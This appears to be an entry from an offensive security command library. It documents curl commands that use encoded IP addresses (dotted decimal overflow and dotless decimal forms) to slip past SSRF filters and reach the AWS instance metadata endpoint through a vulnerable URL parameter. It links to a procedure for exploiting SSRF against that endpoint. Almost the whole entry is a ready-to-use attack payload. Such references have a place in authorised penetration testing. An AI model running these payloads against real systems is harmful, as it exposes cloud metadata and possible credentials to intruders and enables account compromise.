---
type: command
executor: bash
data: >-
  curl "$_VULN_URL?target=http://425.510.425.510/latest/meta-data/" -v  #
  Example dotted decimal overflow
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - bypass
  - encoding
verified: true
validated: true
---

# curl-ip-encoding-bypasses

## Command

```bash
curl "$_VULN_URL?target=http://425.510.425.510/latest/meta-data/" -v  # Example dotted decimal overflow
```

## Description

Tests IP encoding bypasses for SSRF filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Dotless Decimal

```bash
curl "$_VULN_URL?target=http://2852039166/latest/meta-data/" -v
```

## Expected Output

Metadata despite encoding.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
